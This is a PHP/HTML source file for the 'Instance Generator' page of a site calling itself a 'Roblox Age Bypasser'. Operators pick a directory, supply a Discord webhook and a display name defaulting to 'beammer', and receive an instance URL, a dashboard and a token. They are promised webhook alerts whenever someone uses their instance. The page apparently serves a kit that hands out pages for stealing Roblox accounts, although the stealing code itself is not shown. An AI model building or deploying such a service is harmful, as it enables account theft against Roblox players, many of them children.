<?php
require_once '../config.php';
require_once '../functions.php';

$globalStats = getGlobalStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <title>Instance Generator - Roblox Age Bypasser</title>
    <meta name="description" content="Create your own Roblox age bypasser instance for free. Fast setup with webhook integration.">
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        :root {
            --font-sans: 'Outfit', sans-serif;
            --font-display: 'Space Grotesk', sans-serif;
        }
        
        body {
            font-family: var(--font-sans);
            background: linear-gradient(135deg, #02040a 0%, #0a0e27 50%, #02040a 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: #f8fafc;
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .glass-effect {
            backdrop-filter: blur(10px) saturate(180%);
            background-color: rgba(17, 25, 40, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.125);
        }
        
        .animated-gradient-text {
            background: linear-gradient(90deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #667eea 75%, #764ba2 100%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradientFlow 3s linear infinite;
        }
        
        @keyframes gradientFlow {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center px-4 py-12">
    <div class="max-w-2xl w-full mx-auto space-y-8">
        <!-- Header -->
        <div class="text-center space-y-4">
            <div class="inline-block p-6 bg-white/5 border border-white/10 rounded-3xl glass-effect">
                <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                </svg>
            </div>

            <h1 class="text-4xl md:text-5xl font-bold animated-gradient-text">
                Instance Generator
            </h1>
            
            <p class="text-lg text-white/60 max-w-xl mx-auto">
                Create your own secure bypasser instance in seconds
            </p>

            <!-- Live Stats -->
            <div class="flex items-center justify-center gap-2 text-sm text-white/50">
                <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span><?php echo number_format($globalStats['totalInstances'] ?? 0); ?> instances created</span>
            </div>
        </div>

        <!-- Generator Form -->
        <div class="glass-effect rounded-3xl p-8 space-y-6">
            <form id="generatorForm" class="space-y-6">
                <!-- Directory Name -->
                <div class="space-y-2">
                    <label class="text-sm font-medium text-white/80 ml-1">Instance Directory</label>
                    <input 
                        type="text" 
                        id="directory" 
                        name="directory"
                        placeholder="e.g., mybypass" 
                        class="w-full bg-white/5 border border-white/10 focus:border-white/20 text-white rounded-2xl resize-none placeholder:text-white/20 p-4 outline-none transition-colors"
                        required
                        minlength="3"
                        maxlength="20"
                        pattern="[a-zA-Z0-9_-]+"
                        title="Only letters, numbers, underscores, and hyphens allowed"
                    >
                    <p class="text-xs text-white/40 ml-1">Your instance will be available at: <span class="text-purple-400"><?php echo FULL_URL; ?>/<span id="preview">yourname</span></span></p>
                </div>

                <!-- Webhook URL -->
                <div class="space-y-2">
                    <label class="text-sm font-medium text-white/80 ml-1">Discord Webhook URL</label>
                    <input 
                        type="url" 
                        id="webhook" 
                        name="webhook"
                        placeholder="https://discord.com/api/webhooks/..." 
                        class="w-full bg-white/5 border border-white/10 focus:border-white/20 text-white rounded-2xl resize-none placeholder:text-white/20 p-4 outline-none transition-colors"
                        required
                    >
                    <p class="text-xs text-white/40 ml-1">You'll receive notifications when someone uses your bypasser</p>
                </div>

                <!-- Optional: Username -->
                <div class="space-y-2">
                    <label class="text-sm font-medium text-white/80 ml-1">Display Name (Optional)</label>
                    <input 
                        type="text" 
                        id="username" 
                        name="username"
                        placeholder="beammer" 
                        class="w-full bg-white/5 border border-white/10 focus:border-white/20 text-white rounded-2xl resize-none placeholder:text-white/20 p-4 outline-none transition-colors"
                        maxlength="15"
                    >
                </div>

                <!-- Submit Button -->
                <button 
                    type="submit" 
                    id="submitBtn"
                    class="w-full h-14 bg-white text-black hover:bg-white/90 rounded-2xl text-base font-bold transition-all active:scale-[0.98] flex items-center justify-center gap-3"
                >
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M5 12h14"/>
                        <path d="m12 5 7 7-7 7"/>
                    </svg>
                    Create Instance
                </button>
            </form>

            <!-- Back Link -->
            <div class="text-center pt-4 border-t border-white/10">
                <a href="/" class="text-sm text-white/60 hover:text-white/80 transition-colors">
                    ← Back to Home
                </a>
            </div>
        </div>

        <!-- Info Cards -->
        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div class="glass-effect rounded-2xl p-4 text-center">
                <div class="text-2xl mb-2">⚡</div>
                <div class="text-sm font-semibold">Instant Setup</div>
                <div class="text-xs text-white/50 mt-1">Ready in seconds</div>
            </div>
            <div class="glass-effect rounded-2xl p-4 text-center">
                <div class="text-2xl mb-2">🔒</div>
                <div class="text-sm font-semibold">Secure</div>
                <div class="text-xs text-white/50 mt-1">Protected webhooks</div>
            </div>
            <div class="glass-effect rounded-2xl p-4 text-center">
                <div class="text-2xl mb-2">📊</div>
                <div class="text-sm font-semibold">Dashboard</div>
                <div class="text-xs text-white/50 mt-1">Track your stats</div>
            </div>
        </div>
    </div>

    <script>
        // Preview URL
        document.getElementById('directory').addEventListener('input', function(e) {
            const preview = document.getElementById('preview');
            preview.textContent = e.target.value || 'yourname';
        });

        // Form submission
        document.getElementById('generatorForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const originalBtnText = submitBtn.innerHTML;
            
            // Disable button and show loading
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<div class="spinner"></div> Creating...';
            
            const formData = {
                directory: document.getElementById('directory').value.trim(),
                webhook: document.getElementById('webhook').value.trim(),
                username: document.getElementById('username').value.trim() || 'beammer'
            };
            
            try {
                const response = await fetch('create.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(formData)
                });
                
                const data = await response.json();
                
                if (data.success) {
                    Swal.fire({
                        title: '🎉 Success!',
                        html: `
                            <div class="space-y-4 text-left">
                                <p class="text-gray-300">Your instance has been created successfully!</p>
                                <div class="space-y-2">
                                    <div>
                                        <p class="text-sm text-gray-400">Instance URL:</p>
                                        <p class="text-sm font-mono bg-gray-800 p-2 rounded">${data.data.instanceUrl}</p>
                                    </div>
                                    <div>
                                        <p class="text-sm text-gray-400">Dashboard:</p>
                                        <p class="text-sm font-mono bg-gray-800 p-2 rounded">${data.data.dashboardUrl}</p>
                                    </div>
                                    <div>
                                        <p class="text-sm text-gray-400">Access Token:</p>
                                        <p class="text-sm font-mono bg-gray-800 p-2 rounded break-all">${data.data.token}</p>
                                    </div>
                                </div>
                            </div>
                        `,
                        icon: 'success',
                        background: '#1f2937',
                        color: '#f9fafb',
                        confirmButtonColor: '#8b5cf6',
                        confirmButtonText: 'Open Dashboard',
                        showCancelButton: true,
                        cancelButtonText: 'Close'
                    }).then((result) => {
                        if (result.isConfirmed) {
                            window.location.href = data.data.dashboardUrl;
                        }
                    });
                } else {
                    Swal.fire({
                        title: 'Error',
                        text: data.error || 'Failed to create instance',
                        icon: 'error',
                        background: '#1f2937',
                        color: '#f9fafb',
                        confirmButtonColor: '#ef4444'
                    });
                }
            } catch (error) {
                Swal.fire({
                    title: 'Error',
                    text: 'Failed to connect to server. Please try again.',
                    icon: 'error',
                    background: '#1f2937',
                    color: '#f9fafb',
                    confirmButtonColor: '#ef4444'
                });
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerHTML = originalBtnText;
            }
        });
    </script>
</body>
</html>
